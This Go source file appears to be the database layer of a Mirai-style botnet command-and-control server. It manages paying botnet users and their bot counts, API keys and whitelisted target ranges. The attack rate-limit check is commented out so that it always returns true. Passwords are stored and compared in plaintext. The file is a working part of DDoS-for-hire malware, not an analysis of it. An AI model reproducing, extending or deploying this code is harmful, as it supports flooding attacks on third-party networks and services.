package main

import (
    "database/sql"
    "fmt"
    "net"
    "encoding/binary"
    _"github.com/go-sql-driver/mysql"
    //"time"
    //"errors"
)

type Database struct {
    db      *sql.DB
}

type AccountInfo struct {
    username    string
    maxBots     int
    admin       int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@/%s", dbUser, dbPassword, dbName))//("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    fmt.Println("[database]db=",db)
    if err != nil {
        fmt.Println("[database]err",err)
    }
    fmt.Println("[database]Mysql DB opened")
    return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
    fmt.Println("[database]")
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0}
    }
    fmt.Println("[database]rows:",rows)
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    fmt.Println("[database]rows:",rows)
    return true, accInfo
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    fmt.Println("[database]ContainsWhitelistedTargets_start")
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    fmt.Println("[database]67")
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        // Parse prefix
        ip := net.ParseIP(prefix)
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask { // Whitelist is less specific than attack target
                fmt.Println("[database]ContainsWhitelistedTargets_fin1")
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    return true
                }
            } else if aN < netmask { // Attack target is less specific than whitelist
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    fmt.Println("[database]ContainsWhitelistedTargets_fin2")
                    return true
                }
            } else { // Both target and whitelist have same prefix
                if (iWhitelistPrefix == iAttackPrefix) {
                    fmt.Println("[database]ContainsWhitelistedTargets_fin3")
                    return true
                }
            }
        }
    }
    return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
/*    fmt.Println("[database]CanLaunchAttack_start")
    rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println("[database]CanLaunchAttack_115 rows;",rows)
    var userId, durationLimit, cooldown uint32
    if !rows.Next() {
        return false, errors.New("Your access has been terminated")
    }
    rows.Scan(&userId, &durationLimit, &cooldown)
    fmt.Println("[database]CanLaunchAttack_NOW")
    if durationLimit != 0 && duration > durationLimit {
        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
    }
    rows.Close()
    fmt.Println("[database]CanLaunchAttack_now")
    if allowConcurrent == 0 {
        rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        if rows.Next() {
            var timeSent, historyDuration uint32
            rows.Scan(&timeSent, &historyDuration)
            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
        }
    }

    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
    fmt.Println("[database]CanLaunchAttack_fin")
*/
    return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
    fmt.Println("[database]CheckApiCode")
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
    fmt.Println("[database]CheckApiCode rows",rows)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    fmt.Println("[database]CheckApiCode ROWS",rows)
    return true, accInfo
}
